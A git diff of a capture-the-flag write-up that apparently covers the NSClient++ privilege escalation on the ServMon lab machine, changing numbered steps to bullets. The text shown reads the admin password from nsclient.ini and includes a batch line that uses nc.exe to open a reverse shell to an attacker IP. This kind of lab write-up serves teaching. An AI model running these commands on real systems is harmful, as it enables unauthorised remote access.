@@ -240,7 +240,7 @@ nadine@SERVMON C:\>dir "Program Files"
 
 We start by exploring and gathering the informations we need in order to make the exploit work.
 
-1. Grab web administrator password :
+- Grab web administrator password :
 
 ```
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
@@ -278,12 +278,12 @@ I can now navigate to https://localhost:8443/ :
 
 We can use the password from the config file we found earlier and move on to the next step of the exploitation.
 
-2. Download nc.exe and evil.bat to c:\temp from attacking machine
-	``@echo off  c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe``
+- Download nc.exe and evil.bat to c:\temp from attacking machine
+``@echo off  c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe``
   
 I made a file named pi.bat in my kali with the lines suggested from the exploit steps and uploaded it alongside with nc.exe in ``C:\Temp\`` of the machine.
 
-3.Add script foobar to call evil.bat and save settings
+- Add script foobar to call evil.bat and save settings
 
 Next thing , I am going to add a new script in the application named ``whatever u want`` which calls the script I saved in `C:\Temp`
 
